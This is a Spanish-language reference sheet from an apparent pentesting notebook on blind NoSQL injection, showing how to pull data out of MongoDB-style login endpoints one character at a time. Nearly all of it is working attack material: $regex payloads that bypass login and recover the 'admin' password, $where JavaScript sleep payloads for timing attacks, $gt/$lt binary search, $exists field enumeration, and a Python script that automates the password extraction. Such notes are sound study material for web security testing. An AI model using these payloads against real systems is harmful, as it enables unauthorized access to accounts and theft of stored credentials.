---
tipo: meta
aliases:
  - NoSQL blind extraction
  - regex char by char
  - NoSQL timing
tags:
  - meta/referencia
  - dominio/web
---

# NoSQL extracción ciega - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo sacar datos carácter por carácter cuando no se reflejan. Los operadores base están en [[NoSQL operadores - matriz de referencia]]; el criterio, en [[NoSQL - extracción ciega]] y [[NoSQL - inyección de JavaScript]].

Estructura paralela a [[SQLi ciego - matriz de referencia]]: lo único que cambia entre canales es el oráculo. Todo lo demás es la misma búsqueda.

## 1. El oráculo — qué distingue verdadero de falso

| Canal | Verdadero | Falso |
|---|---|---|
| Booleano por respuesta | login exitoso / `200` / contenido presente | falla / `403` / vacío |
| Temporal (JS) | la respuesta **tarda** N ms | responde al instante |

El booleano por `$regex` es el primero a probar. El temporal necesita `$where` con JavaScript — ver § 4.

## 2. Confirmar el oráculo

```
{"user":"admin","pass":{"$regex":"^.*"}}   → siempre verdadero (login entra)
{"user":"admin","pass":{"$regex":"^zzz"}}  → casi siempre falso
```

Si el primero entra y el segundo no, hay oráculo booleano sobre `pass`.

## 3. Extracción carácter por carácter con `$regex`

Medir la longitud primero, para no probar de más:

```
{"user":"admin","pass":{"$regex":"^.{8}$"}}   → ¿la contraseña tiene 8 caracteres?
```

Iterar el número hasta acertar.

Extraer, fijando un carácter por vez:

```
{"user":"admin","pass":{"$regex":"^a"}}    → ¿empieza con 'a'?
{"user":"admin","pass":{"$regex":"^b"}}    → ¿con 'b'?
...fijado el primero (ej. 'p'):
{"user":"admin","pass":{"$regex":"^pa"}}   → ¿segundo es 'a'?
{"user":"admin","pass":{"$regex":"^pb"}}
```

Bisecar el alfabeto para ir más rápido:

```
{"$regex":"^[a-m]"}   → ¿está en la primera mitad?
{"$regex":"^[a-f]"}   → afinar
```

Caracteres especiales del regex —`.`, `$`, `^`, `\`— se escapan con `\\` en el patrón.

## 4. Canal temporal con `$where`

Cuando no hay oráculo booleano —la respuesta es idéntica siempre—. Necesita evaluación de JavaScript, ver [[NoSQL - inyección de JavaScript]]:

```json
{"$where":"if(this.pass[0]=='a'){sleep(1000)}"}
{"$where":"this.pass[0]=='a' && sleep(1000)"}
```

Retarda 1 segundo si el primer carácter coincide. Se itera igual que el booleano, midiendo el tiempo en vez del contenido.

Longitud por tiempo:
```json
{"$where":"this.pass.length==8 && sleep(1000)"}
```

## 5. Comparación por rango — para datos ordenables

Más rápido que `$regex` cuando el dato es numérico o comparable:

```json
{"campo":{"$gt":"m"}}   → ¿mayor que 'm'? búsqueda binaria
{"campo":{"$lt":"m"}}
```

Sobre un ObjectId, un timestamp o un número, la búsqueda binaria con `$gt`/`$lt` saca el valor en log(n) consultas en vez de probar carácter por carácter.

## 6. Enumerar campos con `$exists`

Antes de extraer, saber qué campos hay:

```json
{"user":"admin","secretField":{"$exists":true}}
```

Combinado con una lista de nombres candidatos, revela la estructura del documento sin introspección.

## 7. Automatizar

`nosqlmap` hace el salto de auth y la extracción por `$regex`.

Script propio, el esqueleto:

```python
import requests, string
extraido = ""
while True:
    for c in string.printable:
        patron = "^" + re_escape(extraido + c)
        r = requests.post(URL, json={"user":"admin","pass":{"$regex":patron}})
        if es_verdadero(r):     # login exitoso, código, o contenido
            extraido += c
            break
    else:
        break
print(extraido)
```

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El `$regex` no filtra nada | La entrada no llega a un objeto. Ver [[NoSQL operadores - matriz de referencia]] § 0 |
| Todos los patrones dan verdadero | El oráculo está invertido o `pass` no es el campo. Confirmar con § 2 |
| El carácter especial rompe el patrón | Escapar con `\\` en el regex |
| El canal temporal no retarda | JS deshabilitado en el servidor. Sin canal temporal |
| La extracción es lentísima | Hay límite de tasa, o cada consulta es cara. Medir si vale la pena |
| `sleep` no existe | Versión de Mongo sin `sleep`; usar un bucle que consuma tiempo |
| Se traba a mitad de un campo | Carácter fuera del conjunto probado. Ampliar el alfabeto |

## Relacionadas

[[MOC - NoSQL injection]] · [[NoSQL operadores - matriz de referencia]] · [[NoSQL - extracción ciega]] · [[SQLi ciego - matriz de referencia]]
